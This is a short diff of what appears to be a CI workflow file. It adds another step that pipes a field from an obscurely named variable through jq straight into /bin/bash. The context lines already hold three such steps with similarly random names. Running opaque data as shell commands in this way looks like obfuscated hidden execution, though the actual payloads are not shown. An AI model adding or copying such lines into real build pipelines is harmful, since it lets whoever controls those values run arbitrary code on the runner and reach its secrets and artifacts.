@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$y301" | jq -r .hw9 | /bin/bash
           printf '%s' "$wmf45" | jq -r .qtqh17 | /bin/bash
           echo $ksvfq2 | jq -r .yiip4804 | /bin/bash
+          echo $z0 | jq -r .x3748 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
